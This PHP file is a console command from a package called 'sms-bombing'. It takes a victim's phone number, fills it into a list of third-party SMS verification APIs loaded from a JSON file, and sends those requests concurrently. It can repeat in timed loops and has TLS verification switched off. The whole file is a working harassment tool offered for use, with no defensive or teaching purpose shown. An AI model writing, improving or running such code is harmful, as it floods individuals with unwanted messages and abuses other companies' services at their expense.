<?php

/*
 * This file is part of james.xue/sms-bombing.
 *
 * (c) xiaoxuan6 <15227736751@qq.com>
 *
 * This source file is subject to the MIT license that is bundled
 * with this source code in the file LICENSE.
 *
 */

namespace Vinhson\SmsBombing\Commands;

use Illuminate\Support\Collection;
use GuzzleHttp\Psr7\{Request, Response};
use GuzzleHttp\Exception\RequestException;
use Symfony\Component\Console\Helper\ProgressBar;
use Symfony\Component\Console\Output\OutputInterface;
use Symfony\Component\Console\SingleCommandApplication;
use GuzzleHttp\{Client, Exception\ConnectException, Pool};
use Symfony\Component\Console\Input\{InputArgument, InputInterface, InputOption};

class SMSBombingCommand extends SingleCommandApplication
{
    protected function configure()
    {
        $this->setName('sms-bombing')
            ->setDescription('短信轰炸')
            ->addArgument('phone', InputArgument::REQUIRED, '轰炸手机号')
            ->addOption('num', 'num', InputOption::VALUE_OPTIONAL, '轰炸次数', 10)
            ->addOption('loop', 'l', InputOption::VALUE_OPTIONAL, '启动循环轰炸次数,', 0)
            ->addOption('intervals', 'i', InputOption::VALUE_OPTIONAL, '循环轰炸间隔时间', 0)
            ->addOption('timeout', 't', InputOption::VALUE_OPTIONAL, '请求超时时间', 30)
            ->addOption('length', 'length', InputOption::VALUE_OPTIONAL, '报错展示长度', 64);
    }

    /**
     * @param InputInterface $input
     * @param OutputInterface $output
     * @return int
     */
    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $i = 1;
        $status = true;
        $apis = $this->fetchApi();
        $num = $input->getOption('num');
        $loop = $input->getOption('loop');
        $phone = $input->getArgument('phone');

        do {
            $apis = $num == 'all' ? $apis->toArray() : ($num > $apis->count() ? $apis->toArray() : $apis->random($num)->toArray());
            $requests = function () use ($apis, $phone) {
                foreach ($apis as $api) {
                    $url = str_replace('[phone]', $phone, $api['url']);
                    $body = is_array($api['data']) ? array_map(fn ($item): string|array => str_replace('[phone]', $phone, $item), $api['data']) : [];

                    $body = isset($api['form']) ? http_build_query($body) : json_encode($body, JSON_UNESCAPED_UNICODE);
                    yield new Request($api['method'], $url, is_array($api['header']) ? $api['header'] : [], $body);
                }
            };

            $fn = fn ($body) => mb_strlen($body) > 128 ? mb_substr($body, 0, $input->getOption('length')) : $body;

            $pool = new Pool(new Client(['verify' => false, 'timeout' => $input->getOption('timeout')]), $requests(), [
                'concurrency' => 5,
                'fulfilled' => function (Response $response, $index) use ($output, $fn): void {
                    $body = $fn($response->getBody());
                    $output->writeln("<info>索引：{$index}</info>" . " 请求结果：<comment>{$body}</comment>");
                },
                'rejected' => function (RequestException|ConnectException $reason, $index) use ($output, $fn): void {
                    $message = $reason instanceof ConnectException ? '请求超时， 稍后重试！' : $fn($reason->getMessage());
                    $output->writeln("<info>索引：{$index}</info>" . " 请求结果：<error>{$message}</error>");
                },
            ]);

            $promise = $pool->promise();
            $promise->wait();

            if ($loop > 0 && $i < $loop) {
                $i++;

                $intervals = $input->getOption('intervals');
                if ($intervals > 0) {
                    $output->writeln(PHP_EOL . "<info>循环轰炸中…… 等待第 {$i} 轮轰炸</info>");
                    $progressBar = new ProgressBar($output);
                    $progressBar->start($intervals);
                    $j = 0;
                    while ($j++ < $intervals) {
                        sleep(1);
                        $progressBar->advance();
                    }
                    $progressBar->finish();
                    $output->writeln("");
                }

            } else {
                $status = false;
            }

        } while ($status);

        return self::SUCCESS;
    }

    /**
     * @return Collection
     */
    protected function fetchApi(): Collection
    {
        return collect(json_decode(file_get_contents(__DIR__ . '/../../api.json'), true));
    }
}
